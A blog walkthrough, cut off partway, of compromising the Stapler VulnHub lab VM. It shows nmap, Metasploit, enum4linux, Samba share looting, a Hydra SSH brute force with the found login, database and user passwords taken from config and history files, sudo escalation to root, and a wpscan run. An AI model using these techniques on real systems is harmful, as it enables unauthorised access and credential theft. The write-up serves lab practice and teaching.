---
layout: post
title: "Got a Stapler?"
date: 2018-05-26 17:24:11 -0400
comments: true
categories: [penetration testing, writeups]
keywords: stapler, stapler vulnhub, stapler walkthrough, stapler writeup, vulnhub, pentest lab, hacking lab, ctf
description: Stapler writeup
---

Today's target is a VM made by g0tmi1k for BsidesLondon 2016. So this should be a fun one! From the description:

``` 
| + There are multiple methods to-do this machine         |
|   + At least two (2) paths to get a limited shell       |
|   + At least three (3) ways to get a root access        |
```

<!-- more -->

``` 
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.217.132
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: SupportsCompression, LongPassword, LongColumnFlag, ODBCClient, Support41Auth, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, FoundRows, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: *o\x069%}F\x0B\x1B+'\x14l\x19PET8\x15J
|_  Auth Plugin Name: 88
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.70%I=7%D=5/27%Time=5B0A6560%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 00:0C:29:2B:76:7B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h37m22s, deviation: 34m37s, median: 2h57m21s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2018-05-27T11:57:06+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-05-27 06:57:06
|_  start_date: N/A

```

Many services, so multiple entry points..hopefully. I decided to check each of them.

## FTP server

In the port scan results we saw how the FTP server allows anonymous logins. I wanted to find out more about it and used the Metasploit auxiliary FTP scanner:

``` 
msf auxiliary(scanner/ftp/ftp_version) > run

[+] 192.168.217.141:21    - FTP Banner: '220-\x0d\x0a220-|-----------------------------------------------------------------------------------------|\x0d\x0a220-| Harry, make sure to update the banner when you get a chance to show who has access here |\x0d\x0a220-|-----------------------------------------------------------------------------------------|\x0d\x0a220-\x0d\x0a220 \x0d\x0a'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now we know a possible username. Next I logged in anonymously to the server and found a note, which I downloaded:

``` 
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.05 secs (1.9866 kB/s)
```

The note reveals more names that might come in handy later:

``` 
cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

Before moving on, I made a list of the usernames that were found so far + root:

``` 
root@kali:~# cat users
harry
elly
john
root
```

## OpenSSH 7.2p2

With the usernames I found, I tried the [OpenSSH 7.2p2 - Username Enumeration exploit](https://www.exploit-db.com/exploits/40136/), but with no success:

``` 
python 40136.py -U users 192.168.217.141


User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari


[*] Testing SSHD at: 192.168.217.141:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
[*] Getting baseline timing for authenticating non-existing users............
[*] Baseline mean for host 192.168.217.141 is 0.0489913 seconds.
[*] Baseline variation for host 192.168.217.141 is 0.0210717273238 seconds.
[*] Defining timing of x < 0.112206481972 as non-existing user.
[*] Testing your users...
[-] harry - timing: 0.075312
[-] elly - timing: 0.06393
[-] john - timing: 0.050554
[-] root - timing: 0.084294
```

I decided to move on and come back if I get more usernames or fail to get in with other methods.

## dnsmasq

After some research, I found that dnsmasq 2.75 is prone to multiple DoS vulnerabilities:

https://www.cvedetails.com/cve/CVE-2015-8899/

https://www.exploit-db.com/exploits/42942/

We don't want to crash the machine, but we could if we wanted to :)

## Web server on port 80

The webpage seems empty, with only a Not Found message that states "The requested resource / was not found on this server."

I ran Nikto with no big discoveries:

``` 
nikto -h http://192.168.217.141/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.217.141
+ Target Hostname:    192.168.217.141
+ Target Port:        80
+ Start Time:         2018-06-01 04:44:48 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
+ End Time:           2018-06-01 04:45:10 (GMT-4) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Downloaded the .bashrc and .profile files, but there was nothing useful in there.

## Doom

Here I couldn't find much, the data returned when connecting to it is gibberish. I've read online about how this could be used for the original Doom game. But there was something that caught my eye when Nmap attempted to fingerprint this:

``` 
message2.jpgUT
```

Maybe I can redirect this to a file and get an image. 

``` 
nc -vn 192.168.217.141 666 > something
(UNKNOWN) [192.168.217.141] 666 (?) open
root@kali:~# file something 
something: Zip archive data, at least v2.0 to extract
```

Nice, an archive! Inside there was the image from earlier:

``` 
unzip something
Archive:  something
  inflating: message2.jpg      
```

{% img center /images/pentest/stapler/message2.jpg 'message' 'message' %}

This is it? Maybe there's something more..I ran strings on it to get another message:

``` 
1If you are reading this, you should get a cookie!
```

At least it's something..

## MySQL

Nothing significant here, but something must be using this database.

# Shell #1 - Samba

I used enum4linux for Samba enumeration, but only showing what I found most interesting below:

``` 
enum4linux -a 192.168.217.141
============================================ 
|    Share Enumeration on 192.168.217.141    |
 ============================================ 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            RED

[+] Attempting to map shares on 192.168.217.141
//192.168.217.141/print$	Mapping: DENIED, Listing: N/A
//192.168.217.141/kathy	Mapping: OK, Listing: OK
//192.168.217.141/tmp	Mapping: OK, Listing: OK
//192.168.217.141/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

========================================================================== 
|    Users on 192.168.217.141 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================== 
+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```

That's a ton of users! I've proceeded to look at the shares with the guest/guest combination:

``` 
smbclient //192.168.217.141/kathy -U guest
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun  3 12:52:52 2016
  ..                                  D        0  Mon Jun  6 17:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016
  backup                              D        0  Sun Jun  5 11:04:14 2016

		19478204 blocks of size 1024. 16396296 blocks available
```

I've looked on the net how to download entire folders and then did just that:

``` 
smb: \> tarmode
tar:316  tarmode is now full, system, hidden, noreset, quiet
smb: \> recurse
smb: \> prompt
smb: \> mget kathy_stuff\
NT_STATUS_OBJECT_NAME_INVALID listing \kathy_stuff\
smb: \> mget kathy_stuff
getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> backup
smb: \> mget backup
getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (176.4 KiloBytes/sec) (average 43.9 KiloBytes/sec)
getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (14224.9 KiloBytes/sec) (average 10879.4 KiloBytes/sec)
```

The sequence of commands for downloading folders with smbclient and their description is below:

``` 
smb: \> ? tarmode
HELP tarmode:
	<full|inc|reset|noreset> tar's behaviour towards archive bits

smb: \> ? recurse
HELP recurse:
	toggle directory recursion for mget and mput

smb: \> ? prompt
HELP prompt:
	toggle prompting for filenames for mget and mput

smb: \> ? mget
HELP mget:
	<mask> get all the matching files
```

Next I looked at the tmp share but it was empty. So it's time to see what we've got:

``` 
root@kali:~/kathy_stuff# ls
todo-list.txt
root@kali:~/kathy_stuff# cat todo-list.txt 
I'm making sure to backup anything important for Initech, Kathy
```

Well then, something interesting has to be inside the backup folder:

``` 
root@kali:~/backup# ls
vsftpd.conf  wordpress-4.tar.gz
```

The config file for vsftpd and a Wordpress backup! I tried grep'ing for passwords and looked over the config file, but nothing overly obvious, so again I left these for later in case nothing else works out. For now, I thought about trying my luck again on SSH with the new users. First I put the output from the Samba enumeration in a file and then I selected only the username part and put it in the users file:

``` 
cat userlist | cut -d'\' -f2 | cut -d' ' -f1 > users
cat users
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

There has to be a reason for the ease of enumerating all these users, so I used the file to bruteforce the SSH login, to have something going while working on other services. I used Hydra with the *nsr* flag for additional checks of "n" for null password, "s" try login as pass, "r" try the reverse login as pass. And I got something super fast!

``` 
hydra -L users -e nsr 192.168.217.141 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-02 07:49:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:30/p:3), ~6 tries per task
[DATA] attacking ssh://192.168.217.141:22/
[22][ssh] host: 192.168.217.141   login: SHayslett   password: SHayslett
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-02 07:50:11
```

Woohoo, a user we can log in with!

``` 
ssh SHayslett@192.168.217.141
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.217.141's password: 
Welcome back!


SHayslett@red:~$ 
```

I did some enumeration. In the web directory I found another hidden message:

``` 
SHayslett@red:~$ cat /var/www/https/announcements/message.txt 
Abby, we need to link the folder somewhere! Hidden at the mo
```

Inside the /srv folder I noticed a tftp directory, so I checked if TFTP is running, and it was:

``` 
netstat -lnp | grep 69
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
unix  2      [ ACC ]     STREAM     LISTENING     16924    -                   /var/run/samba/nmbd/unexpected
```

I made a note of this and continued looking. In the Wordpress files I found the MySQL credentials inside the <code>wp-config.php</code> file:

``` 
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

On this system there are loads of home directories:

``` 
ls /home
AParnell  DSwanger    IChadwick  JKanode  LSolum2  NATHAN      SHAY       www
CCeaser   Eeth        jamie      JLipps   MBassin  peter       SHayslett  zoe
CJoo      elly        JBare      kai      mel      RNunemaker  SStroud
Drew      ETollefson  jess       LSolum   MFrei    Sam         Taylor
```

I was able to list the contents of the home folders and one of them stood out:

``` 
ls -alh -R /home
/home/peter:
total 72K
drwxr-xr-x  3 peter peter 4.0K Jun  3  2016 .
drwxr-xr-x 32 root  root  4.0K Jun  4  2016 ..
-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
-rw-r--r--  1 peter peter  220 Jun  3  2016 .bash_logout
-rw-r--r--  1 peter peter 3.7K Jun  3  2016 .bashrc
drwx------  2 peter peter 4.0K Jun  6  2016 .cache
-rw-r--r--  1 peter peter  675 Jun  3  2016 .profile
-rw-r--r--  1 peter peter    0 Jun  3  2016 .sudo_as_admin_successful
-rw-------  1 peter peter  577 Jun  3  2016 .viminfo
-rw-rw-r--  1 peter peter  39K Jun  3  2016 .zcompdump
ls: cannot open directory '/home/peter/.cache': Permission denied
```

That's interesting, but there's nothing in that file. I've looked randomly in the *.bash_history* of some users and saw there were 1-2 lines of irrelevant commands like exit, top. I decided to list all the history files and see if there are discrepancies in their size:

``` 
SHayslett@red:~$ ls -alh -R /home | grep '.bash_history'
-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root      10 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
-rw-r--r--  1 root  root    16 Jun  5  2016 .bash_history
-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 JKanode JKanode  167 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root     10 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root      12 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
ls: cannot open directory '/home/peter/.cache': Permission denied
-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root      8 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    9 Jun  5  2016 .bash_history
```

Woot, JKanode's history is 167 bytes long! 

``` 
SHayslett@red:~$ cat /home/JKanode/.bash_history 
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
```

Inside we have JKanode and peter's passwords! I SSH'ed as peter and checked the sudo rights:

``` 
red% whoami
peter
red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```

User peter has unlimited access on the machine! We can become root now:

``` 
red% sudo su
➜  peter ls /root
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
➜  peter cat /root/flag.txt 
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

```

## Web server on port 12380

We've accomplished the objective, but this is not over! Remember, there are multiple ways of getting shells.

{% img center /images/pentest/stapler/stapler-site.png 'stapler' 'webpage' %}

A hastily built website and left unfinished is bound to have something..maybe in the source code?

``` 
<!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! -->
<!--    Change the image source '/images/default.jpg' with your favourite image.     -->
```

Hmm, let's probe further:

``` 
nikto -h 192.168.217.141:12380
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.217.141
+ Target Hostname:    192.168.217.141
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2018-06-01 06:46:45 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '192.168.217.141' does not match certificate's names: Red.Initech
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
```

So this site uses the database and we have robots.txt entries. However, I kept getting redirected to the webpage when trying anything else. Then I realized that I haven't tried browsing the site over SSL, so I did that and found myself looking at a blank page with the text <code>Internal Index Page!</code>. This time I was able to look at robots.txt and visit the entries:

{% img center /images/pentest/stapler/beef.jpg 'admin' 'admin' %}

Ok, a troll. The other entry proved more interesting, because it took me to a Wordpress blog:

{% img center /images/pentest/stapler/initech.png 'initech' 'initech blog' %}

The blog entries mention new plugins and themes..and this being a Wordpress installation, it's time to bring wpscan on the scene!

``` 
wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://192.168.217.141:12380/blogblog/
[+] Started: Fri Jun  1 07:28:02 2018

[!] The WordPress 'https://192.168.217.141:12380/blogblog/readme.html' file exists exposing a version number
[+] Interesting header: DAVE: Soemthing doesn't look right here
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[!] Registration is enabled: https://192.168.217.141:12380/blogblog/wp-login.php?action=register
[+] XML-RPC Interface available under: https://192.168.217.141:12380/blogblog/xmlrpc.php
[!] Upload directory has directory listing enabled: https://192.168.217.141:12380/blogblog/wp-content/uploads/
[!] Includes directory has directory listing enabled: https://192.168.217.141:12380/blogblog/wp-includes/

[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from readme, links opml, stylesheets numbers, advanced fingerprinting, meta generator
[!] 54 vulnerabilities identified from the version number
```

Lots of XSS and other vulnerabilities, but I didn't notice something that I could use immediately, like an arbitrary file upload or code execution. I went ahead and enumerated the users:

``` 
